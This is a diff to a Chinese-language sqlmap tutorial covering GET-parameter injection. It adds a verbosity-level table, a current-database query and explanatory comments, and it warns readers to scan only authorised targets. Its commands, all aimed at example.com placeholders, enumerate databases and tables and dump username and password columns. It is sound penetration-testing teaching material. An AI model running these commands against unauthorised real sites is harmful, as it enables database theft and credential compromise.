@@ -4,19 +4,19 @@
 > sqlmap 是 SQL 注入检测的自动化利器，但**只可用于授权靶场、自有资产或已获书面授权的渗透测试**。对任意未授权站点使用 = 违法。本文所有 URL 均为示例占位（`http://example.com`），切勿直接复制去扫外网。
 
 ## 1. sqlmap 是什么
-
 sqlmap 是一款开源的自动化 SQL 注入检测与利用工具，能自动发现注入点、识别数据库类型、并拖库/提权。
-
 它支持 MySQL、PostgreSQL、MSSQL、Oracle、SQLite 等几乎所有主流数据库，覆盖 GET/POST/Cookie/HTTP 头等注入入口，并提供 tamper 脚本绕过 WAF、OS 级命令执行、文件读写等高级能力。
+```shell
+# 启动sqlmap
+py sqlmap.py --version
+```
 
 ---
 
 ## 2. GET 注入
-
 GET 请求的注入参数直接出现在 URL 的查询字符串里，是 sqlmap 最省事的用法。
 
 ### 2.1 基本检测
-
 ```bash
 # ⭐ 最简用法：把带参数的完整 URL 丢给 sqlmap，它会自动判断是否有注入
 sqlmap -u "http://example.com/product.php?id=1" --batch
@@ -27,20 +27,31 @@ sqlmap -u "http://example.com/product.php?id=1" --batch
 
 > [!tip] 小技巧
 > 加 `-v 3` 可以看到 sqlmap 实际发出的 payload，方便学习注入原理。
-
+```
+-v 0 只输出错误信息
+-v 1 输出基本信息 + 警告（默认）
+-v 2 输出详细信息 + 调试消息
+-v 3 **打印实际发送的HTTP请求Payload（最常用）**
+-v 4 打印HTTP请求头
+-v 5 打印HTTP响应头
+-v 6 打印完整HTTP响应包（全部网页返回内容）
+```
 ### 2.2 拿到数据库清单
 
 ```bash
 # ⭐ 列出所有数据库名
 sqlmap -u "http://example.com/product.php?id=1" --dbs
 
-# ⭐ 指定库后列出表
+# ⭐ 获取当前网站正在使用的数据库名字
+sqlmap -u "http://xxx?id=1" --batch --current-db
+
+# ⭐ 指定库后列出表 （-D 指定数据库名）
 sqlmap -u "http://example.com/product.php?id=1" -D testdb --tables
 
-# ⭐ 指定表后列出列
+# ⭐ 指定表后列出列 （ -T：table，指定表名）
 sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users --columns
 
-# ⭐ 直接拖指定列的数据
+# ⭐ 直接拖指定列的数据（--dump是拖具体数据，需要搭配-D(库) -T(表)）
 sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users -C username,password --dump
 ```
 
